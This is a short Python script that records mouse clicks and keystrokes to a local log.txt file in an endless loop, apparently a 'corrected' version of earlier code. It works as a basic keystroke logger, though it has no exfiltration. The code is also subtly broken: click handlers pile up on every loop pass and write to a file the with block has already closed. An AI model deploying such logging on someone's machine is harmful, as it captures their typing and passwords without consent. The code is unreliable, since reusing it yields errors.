import mouse
import keyboard
import time
import os
def event():
# 1. Open the file in append mode. Use a context manager ('with') to ensure it safely saves and closes.
    with open("log.txt", "a") as file:

    # 2. Corrected typos in function references and added newlines for readability.
        mouse.on_click(lambda: file.write('\nLEFTCLICK\n'))
        mouse.on_double_click(lambda: file.write('\nDOUBLECLICK\n'))
        mouse.on_middle_click(lambda: file.write('\nMIDDLECLICK\n'))
        mouse.on_right_click(lambda: file.write('\nRIGHTCLICK\n'))

    # 4. Use keyboard.read_key() to catch a single keystroke.
        key = keyboard.read_key()
    
    # 5. Write the captured key to the file.
        file.write(f"{key}\n")
while True:
    event()


